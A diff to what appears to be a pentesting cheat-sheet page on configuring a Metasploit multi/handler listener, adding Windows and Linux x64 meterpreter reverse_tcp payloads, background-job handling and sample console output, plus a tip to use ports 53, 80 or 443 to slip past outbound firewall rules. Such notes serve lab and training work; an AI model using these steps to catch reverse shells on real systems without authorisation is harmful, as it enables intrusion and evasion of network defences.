@@ -25,12 +25,23 @@ msf6 > use exploit/multi/handler
 ```
 
 ```console
-set payload windows/meterpreter/reverse_tcp
+# Windows x64
+set payload windows/x64/meterpreter/reverse_tcp
 ```
 
 ```console {class="sample-code"}
-msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-payload => windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+```
+
+```console
+# Linux amd64
+set payload linux/x64/meterpreter/reverse_tcp
+```
+
+```console {class="sample-code"}
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
 ```
 
 ```console
@@ -52,13 +63,25 @@ lport => 1337
 ```
 
 ```console
-run
+# Useful for multiple connections
+set exitonsession false
 ```
 
 ```console {class="sample-code"}
-msf6 exploit(multi/handler) > run
+msf6 exploit(multi/handler) > set exitonsession false
+exitonsession => false
+```
 
-[*] Started reverse TCP handler on 10.10.14.31:1337 
+```console
+run -j
+```
+
+```console {class="sample-code"}
+msf6 exploit(multi/handler) > run -j
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) > 
+[*] Started reverse TCP handler on 10.10.14.4:1337     <----- Press Enter
 ```
 
 <small>*Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules*</small>
